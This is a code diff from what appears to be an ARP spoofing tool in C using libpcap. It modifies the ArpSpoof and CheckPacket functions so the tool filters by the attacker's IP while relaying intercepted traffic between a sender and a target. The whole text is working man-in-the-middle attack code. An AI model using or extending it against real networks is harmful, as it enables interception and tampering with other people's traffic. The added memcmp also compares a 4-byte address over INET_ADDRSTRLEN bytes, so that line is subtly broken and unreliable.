@@ -131,8 +131,7 @@ int AttackPacket(pcap_t* handle, struct ether_addr SenderMac, struct ether_addr 
     return EXIT_SUCCESS;
 }
 
-
-int ArpSpoof(char* LogFilePath, pcap_t* handle, struct ether_addr SenderMac, struct ether_addr LocalMac, struct in_addr TargetIP, struct ether_addr TargetMac, struct in_addr SenderIP){
+int ArpSpoof(char* LogFilePath, pcap_t* handle, struct ether_addr SenderMac, struct ether_addr LocalMac, struct in_addr LocalIP, struct in_addr TargetIP, struct ether_addr TargetMac, struct in_addr SenderIP){
     int32_t res;
     struct pcap_pkthdr* pheader;
     const u_char* packet;
@@ -147,7 +146,7 @@ int ArpSpoof(char* LogFilePath, pcap_t* handle, struct ether_addr SenderMac, str
         if(res == 0)
             continue;
 
-        switch (CheckPacket(packet, SenderMac, LocalMac, SenderIP, TargetIP)){
+        switch (CheckPacket(packet, SenderMac, LocalMac, LocalIP, SenderIP, TargetIP)){
             case 1: /* relay */
                 LOG(LogFilePath, "relay\n");
                 if(relay(LogFilePath, handle, packet, LocalMac, SenderMac, TargetMac, pheader->caplen) != EXIT_SUCCESS){
@@ -166,10 +165,11 @@ int ArpSpoof(char* LogFilePath, pcap_t* handle, struct ether_addr SenderMac, str
 }
 
 
-int CheckPacket(const u_char* packet, struct ether_addr shost, struct ether_addr LocalMac, struct in_addr sIp, struct in_addr dIp){
+int CheckPacket(const u_char* packet, struct ether_addr shost, struct ether_addr LocalMac, struct in_addr LocalIP, struct in_addr sIp, struct in_addr dIp){
     struct ether_header* peth_hdr;
     struct arphdr* parp_hdr;
     struct arp_addr* parp_addr;
+    struct ip* pip_hdr;
 
     peth_hdr = (struct ether_header*) packet;
 
@@ -178,8 +178,12 @@ int CheckPacket(const u_char* packet, struct ether_addr shost, struct ether_addr
         return 0;
 
     /* check packet destination is me(attacker) */
-    if(!memcmp(peth_hdr->ether_dhost, &LocalMac, ETHER_ADDR_LEN))
-        return 0;
+    if(peth_hdr->ether_type == htons(ETHERTYPE_IP)){
+       pip_hdr = (struct ip*)(packet + sizeof(struct ether_header));
+       if(!memcmp(&pip_hdr->ip_dst, &LocalIP ,INET_ADDRSTRLEN)){
+           return 0;
+       }
+    }
     /* check is arp request */
     if(peth_hdr->ether_type == htons(ETHERTYPE_ARP)){
 
